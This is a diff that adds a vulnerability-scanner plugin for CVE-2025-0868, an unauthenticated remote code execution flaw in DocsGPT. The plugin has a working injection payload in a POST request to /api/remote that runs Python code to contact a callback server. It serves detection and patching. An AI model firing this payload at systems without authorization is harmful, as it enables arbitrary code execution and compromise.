@@ -1,0 +1,79 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "DocsGPT_CVE_2025_0868"
+  author: "frkngksl"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-0868"
+  }
+  severity: CRITICAL
+  title: "Remote code execution affecting DocsGPT (CVE-2025-0868)"
+  description: "DocsGPT is an AI-powered, open-source tool that has the function of streamlining the way users interact with documentation. The vulnerability allows unauthorized attackers to execute arbitrary Python code remotely on affected systems. This could potentially lead to complete system compromise, data theft, or service disruption, as the attack requires no authentication and can be executed remotely."
+  recommendation: "Update the version to 0.13.0 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-0868"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/api/remote"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "user=1&source=reddit&name=other&data={\"source\":\"reddit\",\"client_id\":\"1111\",\"client_secret\":1111,\"user_agent\":\"111\",\"search_queries\":[\"\"],\"number_posts\":10,\"rce\\\\\":__import__('requests').get('{{ T_CBS_URI }}')}#\":11}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"success\": true" },
+          { body: {} contains: "\"task_id\":" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
